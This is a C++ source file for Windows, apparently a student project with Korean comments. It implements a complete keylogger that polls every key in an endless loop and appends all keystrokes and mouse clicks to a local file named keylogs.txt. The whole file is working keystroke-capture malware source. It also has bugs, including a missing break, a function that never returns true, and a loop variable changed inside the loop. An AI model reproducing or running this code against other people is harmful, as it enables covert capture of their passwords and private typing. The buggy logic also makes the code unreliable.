#include<Windows.h>
#include<iostream> //ofstream등 명령어를 사용하기 위해

/*
	ofstream : 파일 쓰기
	ifstream : 파일 읽기
*/
#include<fstream>
#include<stdio.h>
#include<string>

using namespace std;
bool caps = false;
void WriteToLog(LPCSTR text)
{
	ofstream logfile; // logfile이라는		txt파일 생-성
	logfile.open("keylogs.txt", fstream::app); // 키 작성하기 위해 파일 열음
	logfile << text; // 키를 파일에다가 작성
	logfile.close(); // 파일 닫기
}	

//위에 함수 발표1

bool Key_Select(int iKey) //이 함수 발표 2
{
	switch (iKey)
	{
		// VK 옵션들 케이스로 구별
	case VK_LBUTTON:
		cout << " lclick ";
		WriteToLog(" lclick ");
		break;
	case VK_RBUTTON:
		cout << " rclick ";
		WriteToLog(" rclick ");
		break;

	case VK_SPACE:
		cout << " ";
		WriteToLog(" ");
		break;
	case VK_RETURN:
		cout << "\n";
		WriteToLog("\n");
		break;
	case VK_SHIFT:
		cout << " *SHIFT* ";
		WriteToLog(" *SHIFT* ");
		break;
	case VK_BACK:
		cout << " BACKSPACE key ";
		WriteToLog(" BACKSPACE key ");
		break;

	case VK_UP:
		cout << " *Up* ";
		WriteToLog(" *Up* ");
		break;
	case VK_DOWN:
		cout << " *Down* ";
		WriteToLog(" *Down* ");
		break;
	case VK_LEFT:
		cout << " *Left* ";
		WriteToLog(" *Left* ");
		break;
	case VK_RIGHT:
		cout << " *Right* ";
		WriteToLog(" *Right* ");
		break;
	case VK_MBUTTON:
		cout << " Middle Click ";
		WriteToLog(" Middle Click ");
		break;
	case VK_TAB:
		cout << " TAB key ";
		WriteToLog(" *TAB key*");
		break;
	case VK_CONTROL:
		cout << " *CTRL* ";
		WriteToLog(" *CTRL* ");
		break;
	case VK_INSERT:
		cout << " INS key ";
		WriteToLog(" INS key ");
		break;
	case VK_DELETE:
		cout << " DEL key";
		WriteToLog(" DEL key ");
		break;
	case VK_NUMPAD0:
		cout << "0";
		WriteToLog("0");
		break;
	case VK_NUMPAD1:
		cout << "1";
		WriteToLog("1");
		break;
	case VK_NUMPAD2:
		cout << "2";
		WriteToLog("2");
		break;
	case VK_NUMPAD3:
		cout << "3";
		WriteToLog("3");
		break;
	case VK_NUMPAD4:
		cout << "4";
		WriteToLog("4");
		break;
	case VK_NUMPAD5:
		cout << "5";
		WriteToLog("5");
		break;
	case VK_NUMPAD6:
		cout << "6";
		WriteToLog("6");
		break;
	case VK_NUMPAD7:
		cout << "7";
		WriteToLog("7");
		break;
	case VK_NUMPAD8:
		cout << "8";
		WriteToLog("8");
		break;
	case VK_NUMPAD9:
		cout << "9";
		WriteToLog("9");
		break;

	case VK_F1:
		cout << " F1 ";
		WriteToLog(" F1 ");
		break;
	case VK_F2:
		cout << " F2 ";
		WriteToLog(" F2 ");
		break;
	case VK_F3:
		cout << " F3 ";
		WriteToLog(" F3 ");
		break;
	case VK_F4:
		cout << " F4 ";
		WriteToLog(" F4 ");
		break;
	case VK_F5:
		cout << " F5 ";
		WriteToLog(" F5 ");
		break;
	case VK_F6:
		cout << " F6 ";
		WriteToLog(" F6 ");
		break;
	case VK_F7:
		cout << " F7 ";
		WriteToLog(" F7 ");
		break;
	case VK_F8:
		cout << " F8 ";
		WriteToLog(" F8 ");
		break;
	case VK_F9:
		cout << " F9 ";
		WriteToLog(" F9 ");
		break;
	case VK_F10:
		cout << " F10 ";
		WriteToLog(" F10 ");
		break;
	case VK_F11:
		cout << " F11 ";
		WriteToLog(" F11 ");
		break;
	case VK_F12:
		cout << " F12 ";
		WriteToLog(" F12 ");
		break;

	case VK_OEM_PLUS:
		cout << " + ";
		WriteToLog(" + ");
		break;
	case VK_OEM_MINUS:
		cout << " - ";
		WriteToLog(" - ");
		break;
	case VK_OEM_PERIOD:
		cout << ".";
		WriteToLog(".");
		break;
	case VK_OEM_COMMA:
		cout << ",";
		WriteToLog(",");
		break;

	case VK_VOLUME_UP:
		cout << " VOLUME UP KEY ";
		WriteToLog(" VOLUME UP KEY ");
		break;
	case VK_VOLUME_DOWN:
		cout << " VOLUME DOWN KEY ";
		WriteToLog(" VOLUME DOWN KEY ");
		break;
	case VK_VOLUME_MUTE:
		cout << " VOLUME MUTE KEY ";
		WriteToLog(" VOLUME MUTE KEY ");
		break;
	case VK_CAPITAL:
		cout << " CAPS LOCK ";
		WriteToLog(" CAPS LOCK ");
		if (caps == true)
			caps = false;
		else if (caps == false)
			caps = true;
		break;
	case VK_CANCEL:
		cout << " Ctrl-Break ";
		WriteToLog(" Ctrl-Break ");
		break;
	case VK_MENU:
		cout << " Alt ";
		WriteToLog(" Alt ");
		break;
	case VK_PAUSE:
		cout << " PAU BRK ";
		WriteToLog(" PAU BRK");
		break;
	case VK_HANGUL:
		cout << " 한/영 키 ";
		WriteToLog(" 한/영 키 ");
		break;
	case VK_HANJA:
		cout << " 한자 ";
		WriteToLog(" 한자 ");
		break;
	case VK_ESCAPE:
		cout << " Esc ";
		WriteToLog(" Esc ");
		break;
	case VK_PRIOR:
		cout << "Page Up ";
		WriteToLog(" Page Up ");
		break;
	case VK_NEXT:
		cout << " Page Down ";
		WriteToLog(" Page Down ");
		break;
	case VK_HOME:
		cout << " HOME ";
		WriteToLog(" HOME ");
	case VK_PRINT:
		cout << " PRINT ";
		WriteToLog(" PRINT ");
		break;
	case VK_SNAPSHOT:
		cout << " Print Screen ";
		WriteToLog(" Print Screen ");
		break;
	case VK_HELP:
		cout << " HELP ";
		WriteToLog(" HELP ");
		break;
	case VK_LWIN:
		cout << " 왼쪽 윈도우 키 ";
		WriteToLog(" 왼쪽 윈도우 키 ");
		break;
	case VK_RWIN:
		cout << " 오른쪽 윈도우 키 ";
		WriteToLog(" 오른쪽 윈도우 키 ");
		break;
	case VK_SLEEP:
		cout << " 컴퓨터 전원 ";
		WriteToLog(" 컴퓨터 전원 ");
		break;


	default: return false; 
	
}
}



int main()
{
	char key;
	while (TRUE)
		for (key = 8; key <= 127; key++) // for문은 아스키 코드 값
		{
			if (GetAsyncKeyState(key) == -32767) // -32767 = 0x8001 = 이전에 
				//누른 적이 있고 호출 시점에서 눌린 상태
			{
				if (Key_Select(key) == FALSE)
				{
					if (GetKeyState(VK_SHIFT) < 0) // GetKeyState(VK_SHIFT)는 Shift 키가 눌러져있으면 
						//음수값을 리턴하는 것이다. 그래서 위에 0보다 작을 경우에
						// 
					{
						printf("%c ", key); //원래는 cout << key
						ofstream logfile; //ofstream을 이용하여 logfile이라는 파일 씀
						logfile.open("keylogs.txt", fstream::app); // 키 작성하기 위해 파일 열음
						logfile << key; // 키를 파일에다가 작성
						logfile.close(); //로그파일 닫음
					}
					else if (caps == true) // 
					{
						printf("%c", key);
						ofstream logfile; //ofstream을 이용하여 logfile이라는 파일 씀
						logfile.open("keylogs.txt", fstream::app); // 키 작성하기 위해 파일 열음
						logfile << key; // 키를 파일에다가 작성x	
						logfile.close(); //로그파일 닫음
					}
					else
					{
						key += 32;
						printf("%c", key);
						ofstream logfile; //ofstream을 이용하여 logfile이라는 파일 씀
						logfile.open("keylogs.txt", fstream::app); // 키 작성하기 위해 파일 열음
						logfile << key; // 키를 파일에다가 작성
						logfile.close(); //로그파일 닫음


					}
				}
			}

		}

	return 0;
}
